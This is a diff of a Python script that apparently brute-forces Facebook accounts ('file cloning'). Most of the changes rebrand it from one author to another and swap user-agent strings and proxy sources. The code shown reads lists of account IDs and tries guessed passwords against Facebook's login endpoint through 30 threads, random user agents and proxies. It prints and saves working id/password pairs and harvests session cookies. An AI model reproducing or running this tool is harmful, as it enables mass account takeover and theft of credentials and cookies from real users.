@@ -1,12 +1,11 @@
-#MAKED-BY-MD RIFAT REZA
-#GITHUB-R4G3-F14M3
+#GITHUB-SHANTO-KING
 #ACTIVE FILE CLONING
 #ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
 #DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
-# =[â€¢]=[SCRIPT]=[ADMIN]=[RIFAT]=[â€¢]=
+# =[â€¢]=[SCRIPT]=[ADMIN]=[SHANTO]=[â€¢]=
 #------------------[ Install-1 ]-------------------#
 import os 
-#-----------------[ RIFAT-King ]-------------------# 
+#-----------------[ SHANTO-King ]-------------------# 
 os.system("pkg install sox -y")
 os.system("play op.mp3")
 os.system("pkg install espeak")
@@ -28,22 +27,21 @@ from rich.text import Text as tekz
 pretty.install()
 CON=sol()
 #------------------[ USER-AGENT ]-------------------#
-ua = "[FBAN/FB4A;FBAV/303.0.0.3.124;FBBV/533556795;FBDM/{density=2.3,width=1080,height=1478};FBLC/en_GB;FBRV/968917366;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
-ua = "[FBAN/FB4A;FBAV/326.0.0.3.115;FBBV/836847866;FBDM/{density=3.2,width=1080,height=1421};FBLC/en_PK;FBRV/736010837;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
-ua = "[FBAN/FB4A;FBAV/384.0.0.8.140;FBBV/514507241;FBDM/{density=3.3,width=1080,height=1458};FBLC/en_US;FBRV/974470275;FBCR/Vi India;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
-ua = "[FBAN/FB4A;FBAV/201.0.0.4.185;FBBV/721475978;FBDM/{density=3.2,width=1080,height=1430};FBLC/en_GB;FBRV/549098911;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
-ua = "[FBAN/FB4A;FBAV/369.0.0.9.146;FBBV/754616649;FBDM/{density=2.3,width=1080,height=1458};FBLC/he_IL;FBRV/302189657;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
+ua = 'Mozilla/5.0 (Linux; Android 13; Nokia XR20 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]'
+ua = 'Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/364.0.0.14.77;]'
+ua = 'Mozilla/5.0 (Linux; Android 11; Nokia C1 2nd Edition Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/354.0.0.8.108;]'
+ua = 'Mozilla/5.0 (Linux; Android 12; Nokia XR21 Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]'
 ugen2=[]
 ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
+	prox= requests.get('https://github.com/RJSHANTO-217/Api/blob/main/prox.txt').text
 	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRIFAT')
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHANTO')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(1000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -75,7 +73,7 @@ for xd in range(1000):
 	l='Mobile/15E148 Safari/605.1'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-	
+
 for agent in range(random.randint(89999, 100000)):
     a='Mozilla/5.0 (iPod/'
     aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
@@ -108,15 +106,13 @@ for agent in range(random.randint(89999, 100000)):
     fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
     ugen.append(fullagent)
  
- 
- 
 def uaku():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
 		for ub in ua:
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
+		a=requests.get('https://github.com/RJ217/Ua.txt').text
 		ua=open('.bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -127,9 +123,9 @@ cokbrut=[]
  
 def back():
 	login()
-RIFAT="RIFAT"
-imt="SETU"
-ak="CLASS3-"
+SHANTO="SHANTO"
+imt="JENI"
+ak="awsome-"
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -164,7 +160,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
  
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def RIFATj(u):
+def SHANTOj(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
 	os.system('clear')
@@ -179,7 +175,7 @@ while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
  
-    if username == 't' and password == 'r':
+    if username == 'r' and password == 'j':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -187,39 +183,38 @@ while attemps < 12345677901:
         attemps += 1
         continue
 os.system('clear')
+
 #------------------[ MAIN ]-----------------#
 
 def banner():
 	os.system("clear")
 	print (f"""
-\033[0;92mâ•”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•—
-   .########..####.########....###....########
-.##.....##..##..##.........##.##......##...
-.##.....##..##..##........##...##.....##...
-.########...##..######...##.....##....##...
-.##...##....##..##.......#########....##...
-.##....##...##..##.......##.....##....##...
-.##.....##.####.##.......##.....##....##...
-\033[0;92mâ•šâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•   \033[0;92m               
-  \033[0;92mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-\033[0;92m â€¢ MD RIFAT REZA(ðŸ¥°)
-\033[0;92m â€¢ FILE CLONING ACTIVE FIRE (ðŸ”¥)
-\033[0;92m â€¢ VERSION CODE [ 1 ] FIRE (ðŸ˜»)
-  \033[0;92mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \033[1;31m""")
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+                                                 
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
+===============================================
+  Auther        :  RJ SHANTO
+  Facebook      :  SH AN TO 
+  TOOLS         :  PRIVATE
+  Version       :  V-5
+  WhatsApp      :  013108682**
+=============================================== \033[1;31m""")
 def login():
 	banner()
-	RIFATj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	RIFATj('\033[0;97m===============================================')
-	RIFAT= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if RIFAT in ['m']:
+	SHANTOj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	SHANTOj('\033[0;97m===============================================')
+	SHANTO= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if SHANTO in ['m']:
 		public()
-	elif RIFAT in ['1']:
+	elif SHANTO in ['1']:
 		crack_file()
-	elif RIFAT in ['i','0i']:
+	elif SHANTO in ['i','0i']:
 		result()
-	elif RIFAT in ['2','02']:
+	elif SHANTO in ['2','02']:
 		os.system('xdg-open https://wa.me/+8801302199806')
-	elif RIFAT in ['0']:
+	elif SHANTO in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('#DONE LOGOUT ')
@@ -383,7 +378,7 @@ def crack_file():
 	os.system('clear')
 	banner()
 	os.system('espeak -a 300 " your file name"')
-	print('\033[1;32m [Put File Example:  /sdcard/RIFAT.txt  Etc...]')
+	print('\033[1;32m [Put File Example:  /sdcard/SHANTO.txt  Etc...]')
 	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
 	print('')
 	try:lin = open(o).read().splitlines()
@@ -417,8 +412,8 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD FIRE.. ')
-	os.system('espeak -a 300 " 1,  method,  FIRE"')
+	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD RJ.. ')
+	os.system('espeak -a 300 " 1,  method,  RJ"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -435,7 +430,7 @@ def passwrd():
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	RIFATj(f'\033[0;97m===============================================')
+	SHANTOj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -482,15 +477,15 @@ def passwrd():
 					
 				pool.submit(crack,idf,pwv)
 	print('')
-	RIFATj('==========================================')
-	RIFATj('CLONING COMPLETE .......... ')
+	SHANTOj('==========================================')
+	SHANTOj('CLONING COMPLETE .......... ')
 	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[ðŸRIFATðŸ] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[SHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}[{h}• Ok {P}{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -507,10 +502,10 @@ def crack(idf,pwv):
 			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				#RIFAT-King
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢RIFAT-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
+				#SHANTO-King
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -518,14 +513,13 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#RIFAT-King
-				print(f'\r\033[0;92m[RIFAT-âž¼-OKðŸŒº] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
+				#SHANTO-King
+				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
-				os.system('espeak -a 300 " RIFAT,  Ok,  id"')
+				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
 				cek_apk(session,coki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
